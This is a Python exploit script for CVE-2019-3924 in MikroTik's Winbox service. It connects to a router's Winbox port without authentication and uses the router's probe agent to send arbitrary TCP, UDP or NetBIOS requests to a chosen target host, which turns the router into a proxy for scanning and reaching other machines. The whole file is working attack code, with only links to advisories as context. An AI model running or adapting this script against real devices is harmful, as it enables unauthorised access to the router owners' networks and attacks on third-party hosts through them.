#!/usr/bin/env python3

# https://www.tenable.com/cve/CVE-2019-3924
# https://www.tenable.com/security/research/tra-2019-07

import argparse
from binascii import hexlify, unhexlify
from codecs import decode

# https://github.com/jabberd/winbox
from winbox.agent import *

# Resulting error codes
EXIT_OK		= 0
EXIT_BAD 	= 1
EXIT_ERROR	= 2

DEBUG = False
proxy_port = 8291
send = b''
receive = b''
udp = False
netbios = False
target_port = 80

def parse_args():
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-X', '--proxy-host', help = 'Proxy host to connect to', required = True)
	parser.add_argument('-P', '--proxy-port', help = 'Winbox service port of a proxy (default = 8291)', required = False)
	parser.add_argument('-t', '--target-host', help = 'Target host IP address for sending a probe', required = True)
	parser.add_argument('-p', '--target-port', help = 'Target port to probe for (default = 80)', required = False)
	parser.add_argument('-s', '--send', help = 'Request data to send to a target', required = False)
	parser.add_argument('-r', '--receive', help = 'Regexp to match the response data', required = False)
	parser.add_argument('--send-hex', help = 'Request data to send to a target in hex', required = False)
	parser.add_argument('--receive-hex', help = 'Regexp to match the response data in hex', required = False)
	parser.add_argument('-u', '--udp', action = 'store_true', help = 'Use UDP probe instead of TCP', required = False)
	parser.add_argument('--netbios', action = 'store_true', help = 'Use NetBIOS probe', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Display the debugging info', required = False)
	args = vars(parser.parse_args())
	return args

if __name__ == '__main__':
	args = parse_args()
	if args['udp']:
		udp = True
	if args['netbios']:
		if udp:
			print('Error: please don''t use both udp and netbios modes')
			exit(EXIT_ERROR)
		netbios = True
	proxy_host = args['proxy_host']
	if args['proxy_port']:
		proxy_port = int(args['proxy_port'])
	target_host = args['target_host']
	if args['target_port']:
		target_port = int(args['target_port'])
	if args['send'] and args['send_hex']:
		print('Error: use either --send -or --send-hex argument')
		exit(EXIT_ERROR)
	if args['send']:
		send = decode(args['send'], 'unicode_escape').encode()
	elif args['send_hex']:
		send = unhexlify(args['send_hex'])
	if args['receive'] and args['receive_hex']:
		print('Error: use either --receive -or --receive-hex argument')
		exit(EXIT_ERROR)
	if args['receive']:
		receive = decode(args['receive'], 'unicode_escape').encode()
	elif args['receive_hex']:
		receive = unhexlify(args['receive_hex'])
	if args['debug']:
		DEBUG = True
	print('Send:', repr(send), '\nReceive (regex):', repr(receive))
	try:
		print('[*] Connecting to the agent %s:%s' % (proxy_host, proxy_port))
		agent = mtAgent(proxy_host, proxy_port)
	except:
		print('[-] Error connecting to the agent')
		exit(EXIT_ERROR)
	print('[+] Successfully connected to the agent')
	if netbios:
		print('[*] Making a netbios probe to %s' % target_host)
		result = agent.netbios_probe(target_host)
		if result:
			print('[+] Netbios probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] Netbios probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
	elif udp:
		print('[*] Making an UDP probe to %s:%s' % (target_host, target_port))
		result = agent.udp_probe(target_host, target_port, send, receive)
		if result:
			print('[+] UDP probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] UDP probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
	else:
		print('[*] Making a TCP probe to %s:%s' % (target_host, target_port))
		result = agent.tcp_probe(target_host, target_port, send, receive)
		if result:
			print('[+] TCP probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] TCP probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
